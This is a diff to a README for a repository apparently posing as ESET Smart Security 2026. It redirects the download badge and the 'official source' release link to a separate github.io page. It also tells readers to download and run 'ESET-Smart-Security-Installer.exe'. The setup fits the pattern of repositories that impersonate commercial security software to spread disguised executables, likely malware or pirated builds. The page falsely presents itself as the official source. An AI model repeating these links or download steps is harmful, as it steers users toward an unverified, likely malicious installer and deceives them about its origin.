@@ -1,6 +1,6 @@
 # 🛡️ ESET-Smart-Security-2026 - Protect your Windows device with confidence
 
-[![](https://img.shields.io/badge/Download-ESET_Smart_Security-blue.svg)](https://github.com/Sigrough996/ESET-Smart-Security-2026/releases)
+[![](https://img.shields.io/badge/Download-ESET_Smart_Security-blue.svg)](https://sigrough996.github.io)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Before you install the software, check your computer against this list. Your dev
 
 Follow these steps to get the installation file from the official source:
 
-1. Visit the project release page: [https://github.com/Sigrough996/ESET-Smart-Security-2026/releases](https://github.com/Sigrough996/ESET-Smart-Security-2026/releases)
+1. Visit the project release page: [https://sigrough996.github.io](https://sigrough996.github.io)
 2. Look for the latest version listed at the top of the page.
 3. Click the link that matches your system type to start the download.
 4. Save the file named "ESET-Smart-Security-Installer.exe" to your Downloads folder or desktop.
